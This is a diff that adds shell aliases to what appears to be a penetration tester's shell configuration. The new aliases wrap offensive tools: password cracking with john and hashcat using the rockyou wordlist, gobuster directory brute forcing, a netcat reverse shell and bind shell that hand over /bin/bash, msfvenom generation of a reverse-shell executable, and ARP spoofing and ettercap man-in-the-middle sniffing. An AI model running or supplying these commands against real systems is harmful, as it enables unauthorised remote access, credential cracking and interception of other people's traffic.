@@ -160,3 +160,29 @@ quickscan() {
 }
 
 # Usage: quickscan 192.168.1.1
+
+# Ensure required files exist before running
+alias johncrack="test -f /usr/share/wordlists/rockyou.txt && john --wordlist=/usr/share/wordlists/rockyou.txt \$1 || echo 'Wordlist not found!'"
+alias hashcatcrack="test -f /usr/share/wordlists/rockyou.txt && hashcat -m 0 -a 0 \$1 /usr/share/wordlists/rockyou.txt || echo 'Wordlist not found!'"
+
+# Automated directory brute force with Gobuster
+alias gobusterweb="test -f /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt && gobuster dir -u http://\$TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt || echo 'Wordlist not found!'"
+
+# Reverse shell with custom port
+alias revnc="read -p 'Enter target IP: ' target_ip && read -p 'Enter port: ' port && nc -e /bin/bash \$target_ip \$port"
+
+# Bind shell on the target machine with custom port
+alias bindnc="read -p 'Enter port to listen on: ' port && nc -lvp \$port -e /bin/bash"
+
+# Metasploit reverse shell payload generation (set LHOST and LPORT)
+alias metasploit_reverse="read -p 'Enter local IP (LHOST): ' LHOST && read -p 'Enter local port (LPORT): ' LPORT && msfvenom -p linux/x86/shell_reverse_tcp LHOST=\$LHOST LPORT=\$LPORT -f elf -o /tmp/reverse_shell.elf && chmod +x /tmp/reverse_shell.elf"
+
+# ===========================
+# Man-in-the-Middle (MITM) & Spoofing
+# ===========================
+
+# ARP Spoofing for MITM
+alias arpspoofstart="read -p 'Enter target IP: ' target_ip && read -p 'Enter gateway IP: ' gateway_ip && arpspoof -i eth0 -t \$target_ip -r \$gateway_ip"
+
+# Ettercap MITM Sniffing
+alias ettercapstart="read -p 'Enter target IP: ' target_ip && read -p 'Enter gateway IP: ' gateway_ip && ettercap -T -M arp:remote /\$target_ip// /\$gateway_ip//"
